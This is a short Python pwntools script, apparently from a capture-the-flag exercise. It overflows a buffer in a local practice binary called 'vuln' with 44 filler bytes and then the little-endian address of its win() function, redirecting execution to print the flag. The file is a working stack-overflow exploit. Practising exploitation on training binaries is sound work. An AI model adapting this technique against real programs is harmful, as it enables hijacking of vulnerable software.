from random import randint
from pwn import*

# 32 bit
'''
PUSH ARGUMENT_1 (10)
PUSH ARGUMENT_2 (5)
JUMP my_func
'''

# 64 bit
'''
MOV RDI, 0
MOV EAX, 26
JUMP my_func
'''


# will create a process, so we can ensure solution works b4 we connect
p = process('vuln')
elf = context.binary = ELF("vuln", checksec=False)

addr_in_decimal = elf.sym['win']
addr_in_hex = hex(addr_in_decimal)

print(f"[ Address of win function: {addr_in_hex} ]")


# this represents (in little endian) the address of the win() function which prints our flag
# and this will be done from buffer overflow, the p32 -> pack32 (packing it into a 32 bit-architecture)
# box ready-to-go
win_addr_in_little_endian = p32(addr_in_decimal)
payload = b'A'*44 + win_addr_in_little_endian

p.sendline(payload)
p.interactive()

